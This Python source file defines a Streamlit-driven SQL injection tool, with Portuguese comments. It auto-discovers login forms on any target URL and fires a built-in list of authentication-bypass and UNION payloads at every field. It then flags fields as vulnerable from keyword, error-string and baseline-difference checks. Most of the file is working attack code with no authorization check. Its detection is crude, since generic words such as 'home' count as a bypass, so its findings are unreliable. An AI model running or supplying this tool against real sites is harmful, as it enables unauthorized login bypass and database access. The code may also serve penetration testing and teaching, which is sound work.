import time
import random
import streamlit as st
import re
from urllib.parse import urljoin
from config import log_result, get_log_filename
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple, Any
import logging
from datetime import datetime, timezone, timedelta

@dataclass
class VulnerabilityResult:
    """Classe para representar uma vulnerabilidade encontrada"""
    payload: str
    field: str
    scenario_name: str
    response_status: int
    response_url: str
    indicators: List[str]
    timestamp: str

@dataclass
class TestScenario:
    """Classe para representar um cenário de teste"""
    name: str
    action_url: str
    method: str
    fields: List[Dict[str, str]]

class SQLInjectionAttack:
    """
    Classe aprimorada para testes de SQL Injection com detecção automática
    de formulários e análise avançada de vulnerabilidades.
    """
    
    def __init__(self, session_manager):
        self.session_manager = session_manager
        self.vulnerabilities: List[VulnerabilityResult] = []
        self.detected_scenarios: List[TestScenario] = []
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.baseline_response: Optional[Dict] = None
        self.logger = self._setup_logger()
        self.utc_minus_3 = timezone(timedelta(hours=-3))
        
    def _setup_logger(self) -> logging.Logger:
        """Configura logger interno para debug"""
        logger = logging.getLogger('SQLInjectionAttack')
        logger.setLevel(logging.DEBUG)
        return logger
    
    def _get_br_timestamp(self) -> str:
        """Retorna timestamp em horário de Brasília"""
        return datetime.now(self.utc_minus_3).strftime("%Y-%m-%d %H:%M:%S")
    
    def _get_br_timestamp_filename(self) -> str:
        """Retorna timestamp para nome de arquivo em horário de Brasília"""
        return datetime.now(self.utc_minus_3).strftime("%Y%m%d_%H%M%S")
        
    def get_default_sql_payloads(self) -> List[str]:
        """
        Retorna lista otimizada de payloads SQL organizados por categoria.
        """
        return {
            'basic_or': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1'--",
                "' OR '1'='1' #",
                "' OR 1=1 --",
                "' OR 1=1--",
                "' OR 1=1 #",
            ],
            'admin_bypass': [
                "admin' --",
                "admin'--", 
                "admin' #",
                "admin'/**/OR/**/1=1--",
            ],
            'union_based': [
                "' UNION SELECT 1,2,3,4,5 --",
                "' UNION SELECT NULL,NULL,NULL --",
            ],
            'double_quote': [
                '" OR 1=1 --',
                '" OR "1"="1',
                '" OR ""="',
            ],
            'advanced': [
                "' OR 'a'='a",
                "') OR ('1'='1",
                "' OR 'x'='x",
                "1' OR '1'='1' /*",
                "') or '1'='1--",
                "') or ('1'='1--",
                "' OR TRUE--",
                "') OR TRUE--",
                "1' OR 1=1--",
                "1 OR 1=1",
            ]
        }

    def get_flattened_payloads(self) -> List[str]:
        """Retorna lista plana de todos os payloads"""
        payloads_dict = self.get_default_sql_payloads()
        all_payloads = []
        for category_payloads in payloads_dict.values():
            all_payloads.extend(category_payloads)
        return all_payloads

    def establish_baseline(self, target_url: str, add_log) -> Optional[Dict]:
        """
        Estabelece baseline com credenciais normais para comparação.
        """
        add_log("🧪 Estabelecendo baseline com credenciais normais...")
        
        try:
            baseline_data = {
                "Usuario": "Login",
                "Login": "usuario_normal", 
                "Senha": "senha_normal"
            }
            
            response = self.session_manager.session.post(
                target_url,
                data=baseline_data,
                allow_redirects=True,
                timeout=15
            )
            
            baseline_info = {
                'status': response.status_code,
                'url': str(response.url),
                'size': len(response.text),
                'redirects': len(response.history),
                'text_preview': response.text[:500].lower(),
                'headers': dict(response.headers)
            }
            
            add_log(f"📊 BASELINE - Status: {baseline_info['status']}")
            add_log(f"📊 BASELINE - URL: {baseline_info['url']}")
            add_log(f"📊 BASELINE - Tamanho: {baseline_info['size']} chars")
            add_log(f"📊 BASELINE - Redirecionamentos: {baseline_info['redirects']}")
            
            self.baseline_response = baseline_info
            return baseline_info
            
        except Exception as e:
            add_log(f"🔥 Erro no baseline: {str(e)}")
            self.baseline_response = None
            return None

    def discover_form_scenarios(self, target_url: str, add_log) -> List[TestScenario]:
        """
        Descobre automaticamente formulários e campos na página.
        """
        add_log("🔍 Descobrindo formulários automaticamente...")
        
        try:
            response = self.session_manager.session.get(target_url, timeout=10)
            html_content = response.text
            
            add_log(f"🌐 Página carregada - Status: {response.status_code}")
            
            scenarios = self._parse_forms_from_html(html_content, target_url, add_log)
            
            if not scenarios:
                add_log("⚠️ Nenhum formulário detectado, usando cenários padrão...")
                scenarios = self._get_fallback_scenarios(target_url)
            
            self.detected_scenarios = scenarios
            return scenarios
            
        except Exception as e:
            add_log(f"🔥 Erro na descoberta: {str(e)}")
            scenarios = self._get_fallback_scenarios(target_url)
            self.detected_scenarios = scenarios
            return scenarios

    def _parse_forms_from_html(self, html: str, base_url: str, add_log) -> List[TestScenario]:
        """Parse HTML para extrair formulários"""
        scenarios = []
        
        # Regex melhorado para formulários
        form_pattern = r'<form[^>]*>(.*?)</form>'
        forms = re.findall(form_pattern, html, re.DOTALL | re.IGNORECASE)
        
        for i, form_html in enumerate(forms):
            # Extrair atributos do formulário
            action = self._extract_form_attribute(html, 'action', i) or ""
            method = self._extract_form_attribute(html, 'method', i) or "POST"
            
            # Construir URL completa
            action_url = urljoin(base_url, action) if action else base_url
            
            # Extrair campos
            fields = self._extract_form_fields(form_html)
            
            if fields:
                scenario = TestScenario(
                    name=f"Form {i+1} - Auto Detected",
                    action_url=action_url,
                    method=method.upper(),
                    fields=fields
                )
                scenarios.append(scenario)
                
                add_log(f"  📝 Formulário {i+1}: {len(fields)} campos, Action: {action_url}")
                for field in fields:
                    add_log(f"    • {field['name']} ({field['type']})")
        
        return scenarios

    def _extract_form_attribute(self, html: str, attr: str, form_index: int) -> Optional[str]:
        """Extrai atributo específico de um formulário"""
        pattern = rf'<form[^>]*{attr}=["\']([^"\']*)["\']'
        matches = re.findall(pattern, html, re.IGNORECASE)
        return matches[form_index] if form_index < len(matches) else None

    def _extract_form_fields(self, form_html: str) -> List[Dict[str, str]]:
        """Extrai campos de um formulário"""
        fields = []
        
        # Inputs
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']*)["\'])?[^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for name, field_type in input_matches:
            fields.append({
                'name': name,
                'type': field_type or 'text'
            })
        
        # Textareas
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>'
        textarea_matches = re.findall(textarea_pattern, form_html, re.IGNORECASE)
        
        for name in textarea_matches:
            fields.append({
                'name': name,
                'type': 'textarea'
            })
        
        return fields

    def _get_fallback_scenarios(self, target_url: str) -> List[TestScenario]:
        """Cenários padrão quando detecção automática falha"""
        common_endpoints = [
            "",
            "login.php",
            "controller/usuario.php", 
            "auth.php",
            "login"
        ]
        
        scenarios = []
        for i, endpoint in enumerate(common_endpoints):
            action_url = urljoin(target_url, endpoint)
            
            scenario = TestScenario(
                name=f"Fallback {i+1} - {endpoint or 'Same URL'}",
                action_url=action_url,
                method="POST",
                fields=[
                    {'name': 'Usuario', 'type': 'hidden'},
                    {'name': 'Login', 'type': 'text'},
                    {'name': 'Senha', 'type': 'password'}
                ]
            )
            scenarios.append(scenario)
        
        return scenarios

    def generate_test_data(self, scenario: TestScenario, payload: str, target_field: str) -> Dict[str, str]:
        """
        Gera dados de teste inteligentes baseados no tipo de campo.
        """
        data = {}
        
        for field in scenario.fields:
            field_name = field['name']
            field_type = field.get('type', 'text')
            
            if field_name == target_field:
                data[field_name] = payload
            elif field_type == 'password' or any(keyword in field_name.lower() 
                                               for keyword in ['senha', 'pass', 'pwd']):
                data[field_name] = "password123"
            elif field_type == 'hidden':
                data[field_name] = "Login" if 'usuario' in field_name.lower() else ""
            elif field_type in ['email', 'mail']:
                data[field_name] = "admin@test.com"
            else:
                data[field_name] = "admin"
        
        return data

    def analyze_vulnerability_indicators(self, response, payload: str, add_log) -> Tuple[bool, List[str]]:
        """
        Análise avançada de indicadores de vulnerabilidade.
        """
        response_text = response.text.lower()
        indicators_found = []
        
        # Log de debug detalhado
        self._log_response_debug(response, add_log)
        
        # 1. Indicadores de bypass de autenticação
        auth_bypass_indicators = [
            "bem-vindo", "welcome", "dashboard", "home", "admin panel",
            "user profile", "logged in", "login successful", "sucesso",
            "painel", "perfil", "logado", "autenticado", "menu principal",
            "logout", "sair", "painel de controle", "bem vindo"
        ]
        
        for indicator in auth_bypass_indicators:
            if indicator in response_text:
                indicators_found.append(f"auth_bypass:{indicator}")
        
        # 2. Erros SQL explícitos
        sql_error_patterns = [
            "mysql_fetch_array", "you have an error in your sql syntax",
            "warning: mysql_", "mysqlsyntaxerrorexception", "ora-00933",
            "postgresql query failed", "sqlite3.operationalerror",
            "syntax error", "unclosed quotation mark", "mysql_num_rows",
            "mysql error", "sql syntax", "database error"
        ]
        
        for error in sql_error_patterns:
            if error in response_text:
                indicators_found.append(f"sql_error:{error}")
        
        # 3. Análise de comportamento da resposta
        behavior_indicators = self._analyze_response_behavior(response, add_log)
        indicators_found.extend(behavior_indicators)
        
        # 4. Comparação com baseline
        if self.baseline_response:
            baseline_indicators = self._compare_with_baseline(response, add_log)
            indicators_found.extend(baseline_indicators)
        
        vulnerability_detected = len(indicators_found) > 0
        
        if vulnerability_detected:
            add_log(f"        ✅ Indicadores encontrados: {indicators_found}")
        else:
            add_log(f"        ❌ Nenhum indicador de vulnerabilidade")
        
        return vulnerability_detected, indicators_found

    def _log_response_debug(self, response, add_log):
        """Log detalhado da resposta para debug"""
        preview = response.text[:200].replace('\n', ' ').replace('\r', ' ')
        
        add_log(f"        🔍 Status: {response.status_code}")
        add_log(f"        🔍 URL: {response.url}")
        add_log(f"        🔍 Tamanho: {len(response.text)} chars")
        add_log(f"        🔍 Redirecionamentos: {len(response.history)}")
        add_log(f"        🔍 Preview: {preview}...")

    def _analyze_response_behavior(self, response, add_log) -> List[str]:
        """Analisa comportamento da resposta"""
        indicators = []
        response_text = response.text.lower()
        
        # Verificar ausência de campos de login
        login_fields = ["password", "senha", "login", "type='password'"]
        login_found = any(field in response_text for field in login_fields)
        
        if response.status_code == 200 and not login_found:
            # Verificar conteúdo de usuário logado
            logged_content = ["logout", "sair", "perfil", "dashboard", "bem-vindo"]
            logged_found = [content for content in logged_content if content in response_text]
            
            if logged_found:
                indicators.append(f"behavior:no_login_fields_with_user_content")
            else:
                indicators.append(f"behavior:no_login_fields")
        
        # Redirecionamentos suspeitos
        if response.status_code in [302, 301] and len(response.history) > 0:
            if "login" not in str(response.url).lower():
                indicators.append(f"behavior:suspicious_redirect")
        
        return indicators

    def _compare_with_baseline(self, response, add_log) -> List[str]:
        """Compara resposta com baseline estabelecido"""
        indicators = []
        
        if not self.baseline_response:
            return indicators
        
        baseline = self.baseline_response
        
        # Diferença significativa no tamanho
        size_diff = abs(len(response.text) - baseline['size'])
        if size_diff > 1000:
            indicators.append(f"baseline:size_difference:{size_diff}")
        
        # URL diferente
        if str(response.url) != baseline['url']:
            indicators.append(f"baseline:url_change")
        
        # Status diferente
        if response.status_code != baseline['status']:
            indicators.append(f"baseline:status_change")
        
        # Análise de similaridade de conteúdo
        current_preview = response.text[:500].lower()
        baseline_preview = baseline['text_preview']
        
        similarity = self._calculate_text_similarity(current_preview, baseline_preview)
        
        if similarity < 0.3:
            indicators.append(f"baseline:low_similarity:{similarity:.2f}")
        
        return indicators

    def _calculate_text_similarity(self, text1: str, text2: str) -> float:
        """Calcula similaridade básica entre dois textos"""
        words1 = set(text1.split())
        words2 = set(text2.split())
        
        if not words1:
            return 0.0
        
        common_words = words1 & words2
        return len(common_words) / len(words1)

    def test_payload_on_scenario(self, scenario: TestScenario, payload: str, add_log) -> Tuple[bool, List[str]]:
        """
        Testa um payload em todos os campos de um cenário.
        """
        add_log(f"    🔍 Testando: {scenario.name}")
        add_log(f"      🎯 URL: {scenario.action_url}")
        
        vulnerable_fields = []
        
        for field in scenario.fields:
            field_name = field['name']
            
            try:
                test_data = self.generate_test_data(scenario, payload, field_name)
                
                add_log(f"      💉 Campo: {field_name}")
                add_log(f"        📤 Dados: {test_data}")
                
                response = self.session_manager.session.post(
                    scenario.action_url,
                    data=test_data,
                    allow_redirects=True,
                    timeout=15
                )
                
                self.total_attempts += 1
                
                # Analisar vulnerabilidade
                is_vulnerable, indicators = self.analyze_vulnerability_indicators(
                    response, payload, add_log
                )
                
                if is_vulnerable:
                    # Criar registro de vulnerabilidade
                    vulnerability = VulnerabilityResult(
                        payload=payload,
                        field=field_name,
                        scenario_name=scenario.name,
                        response_status=response.status_code,
                        response_url=str(response.url),
                        indicators=indicators,
                        timestamp=self._get_br_timestamp()
                    )
                    
                    self.vulnerabilities.append(vulnerability)
                    vulnerable_fields.append(field_name)
                    self.successful_attempts += 1
                    
                    add_log(f"      ✅ VULNERÁVEL: {field_name}")
                else:
                    self.failed_attempts += 1
                    add_log(f"      ❌ Seguro: {field_name}")
                    
            except Exception as e:
                add_log(f"      🔥 Erro em {field_name}: {str(e)}")
                self.total_attempts += 1
                self.failed_attempts += 1
                continue
        
        return len(vulnerable_fields) > 0, vulnerable_fields

    def generate_final_report(self) -> str:
        """
        Gera relatório final detalhado das vulnerabilidades encontradas.
        """
        if not self.vulnerabilities:
            return f"✅ Sistema seguro! Nenhuma vulnerabilidade SQL encontrada após {self.total_attempts} tentativas."
        
        report = f"🚨 VULNERABILIDADES SQL DETECTADAS ({len(self.vulnerabilities)})\n"
        report += "=" * 60 + "\n\n"
        
        # Agrupar por cenário
        scenarios_vuln = {}
        for vuln in self.vulnerabilities:
            scenario = vuln.scenario_name
            if scenario not in scenarios_vuln:
                scenarios_vuln[scenario] = []
            scenarios_vuln[scenario].append(vuln)
        
        for scenario, vulns in scenarios_vuln.items():
            report += f"📋 Cenário: {scenario}\n"
            report += f"   Vulnerabilidades: {len(vulns)}\n\n"
            
            for vuln in vulns:
                report += f"   💉 Payload: {vuln.payload}\n"
                report += f"   🎯 Campo: {vuln.field}\n"
                report += f"   📊 Status: {vuln.response_status}\n"
                report += f"   🔗 URL: {vuln.response_url}\n"
                report += f"   🔍 Indicadores: {', '.join(vuln.indicators)}\n"
                report += f"   ⏰ Timestamp: {vuln.timestamp}\n"
                report += "   " + "-" * 50 + "\n"
            
            report += "\n"
        
        report += f"📊 ESTATÍSTICAS:\n"
        report += f"   • Total de tentativas: {self.total_attempts}\n"
        report += f"   • Vulnerabilidades encontradas: {len(self.vulnerabilities)}\n"
        report += f"   • Cenários testados: {len(self.detected_scenarios)}\n"
        
        return report

    def _write_final_summary_to_log(self, log_file: str, start_time: str, end_time: str):
        """
        Escreve resumo final no arquivo de log.
        """
        summary = "\n" + "=" * 80 + "\n"
        summary += "📊 RESUMO FINAL DO TESTE DE SQL INJECTION\n"
        summary += "=" * 80 + "\n"
        summary += f"⏰ Início do teste: {start_time}\n"
        summary += f"⏰ Fim do teste: {end_time}\n"
        summary += f"🎯 Total de tentativas: {self.total_attempts}\n"
        summary += f"✅ Tentativas com sucesso (vulneráveis): {self.successful_attempts}\n"
        summary += f"❌ Tentativas falharam (seguras): {self.failed_attempts}\n"
        summary += f"🚨 Total de vulnerabilidades encontradas: {len(self.vulnerabilities)}\n"
        summary += f"📋 Cenários testados: {len(self.detected_scenarios)}\n"
        
        if self.vulnerabilities:
            summary += f"\n🔍 DETALHES DAS VULNERABILIDADES:\n"
            for i, vuln in enumerate(self.vulnerabilities, 1):
                summary += f"  {i}. Payload: {vuln.payload} | Campo: {vuln.field} | Cenário: {vuln.scenario_name}\n"
        
        # Calcular taxa de sucesso
        if self.total_attempts > 0:
            success_rate = (self.successful_attempts / self.total_attempts) * 100
            summary += f"\n�� Taxa de sucesso: {success_rate:.2f}%\n"
        
        summary += "=" * 80 + "\n"
        
        # Escrever no arquivo
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(summary)
        except Exception as e:
            print(f"Erro ao escrever resumo final: {e}")

    def run(self, target_url: str, payloads: Optional[List[str]] = None, 
            log_file: Optional[str] = None, live_log_container=None, 
            progress_container=None) -> str:
        """
        Executa o teste completo de SQL Injection.
        
        Args:
            target_url: URL alvo para teste
            payloads: Lista de payloads (usa padrão se None)
            log_file: Arquivo de log (usa padrão se None)
            live_log_container: Container Streamlit para logs em tempo real
            progress_container: Container Streamlit para barra de progresso
            
        Returns:
            Relatório final das vulnerabilidades encontradas
        """
        # Configuração inicial
        if log_file is None:
            log_file = get_log_filename()
        
        if payloads is None:
            payloads = self.get_flattened_payloads()

        # Reset de estado
        self.vulnerabilities.clear()
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        live_logs = []
        
        # Marcar horário de início
        start_time = self._get_br_timestamp()
        
        # Configurar componentes de progresso
        progress_bar = None
        status_text = None
        if progress_container:
            progress_bar, status_text = progress_container

        def add_log(message: str, update_progress: Optional[int] = None):
            """Função para logging com interface em tempo real"""
            timestamp = datetime.now(self.utc_minus_3).strftime("%H:%M:%S")
            formatted_log = f"[{timestamp}] {message}"
            live_logs.append(formatted_log)
            
            # Salvar em arquivo
            log_result(message, log_file)
            
            # Atualizar interface
            if live_log_container:
                display_logs = live_logs[-15:] if len(live_logs) > 15 else live_logs
                live_log_container.text_area(
                    f"�� Logs em Tempo Real ({len(live_logs)} total):", 
                    value="\n".join(display_logs),
                    height=300,
                    key=f"live_logs_{len(live_logs)}"
                )
            
            if progress_bar and update_progress is not None:
                progress_bar.progress(update_progress)
            
            if status_text:
                status_text.text(f"🔄 {message}")

        # Início do teste
        add_log("💉 Iniciando teste avançado de SQL Injection...", 0)
        add_log(f"🎯 URL alvo: {target_url}")
        add_log(f"⏰ Horário de início: {start_time}")
        
        # Fase 1: Estabelecer baseline
        add_log("📊 Fase 1: Estabelecendo baseline...", 10)
        self.establish_baseline(target_url, add_log)
        
        # Fase 2: Descobrir formulários
        add_log("🔍 Fase 2: Descobrindo formulários...", 20)
        scenarios = self.discover_form_scenarios(target_url, add_log)
        
        # Calcular estimativas
        total_fields = sum(len(s.fields) for s in scenarios)
        estimated_attempts = len(payloads) * total_fields
        add_log(f"📊 Estimativa: {len(payloads)} payloads × {total_fields} campos = {estimated_attempts} tentativas")
        
        # Fase 3: Executar testes
        add_log("💉 Fase 3: Executando testes de injeção...", 30)
        
        for i, payload in enumerate(payloads):
            progress_percent = 30 + int((i / len(payloads)) * 60)
            
            add_log(f"💉 Payload {i+1}/{len(payloads)}: {payload}", progress_percent)
            
            payload_successful = False
            
            for scenario in scenarios:
                vulnerability_found, vulnerable_fields = self.test_payload_on_scenario(
                    scenario, payload, add_log
                )
                
                if vulnerability_found:
                    payload_successful = True
                    add_log(f"    🚨 Campos vulneráveis: {', '.join(vulnerable_fields)}")
            
            if payload_successful:
                add_log(f"✅ Payload efetivo: {payload}")
            else:
                add_log(f"❌ Payload seguro: {payload}")

            # Delay inteligente
            sleep_time = random.uniform(1.5, 2.5)
            add_log(f"⏱️ Aguardando {sleep_time:.1f}s...")
            
            # Sleep responsivo
            for step in range(10):
                time.sleep(sleep_time / 10)

        # Fase 4: Gerar relatório
        add_log("📋 Fase 4: Gerando relatório final...", 95)
        
        # Marcar horário de fim
        end_time = self._get_br_timestamp()
        
        # Escrever resumo final no log
        self._write_final_summary_to_log(log_file, start_time, end_time)
        
        # Log do resumo final
        add_log(f"📊 RESUMO FINAL:")
        add_log(f"   ⏰ Duração: {start_time} até {end_time}")
        add_log(f"   🎯 Total de tentativas: {self.total_attempts}")
        add_log(f"   ✅ Sucessos (vulneráveis): {self.successful_attempts}")
        add_log(f"   ❌ Falhas (seguras): {self.failed_attempts}")
        add_log(f"   🚨 Vulnerabilidades encontradas: {len(self.vulnerabilities)}")
        
        if self.total_attempts > 0:
            success_rate = (self.successful_attempts / self.total_attempts) * 100
            add_log(f"   📈 Taxa de sucesso: {success_rate:.2f}%")
        
        final_report = self.generate_final_report()
        
        add_log("🏁 Teste de SQL Injection finalizado!", 100)
        time.sleep(1)
        
        return final_report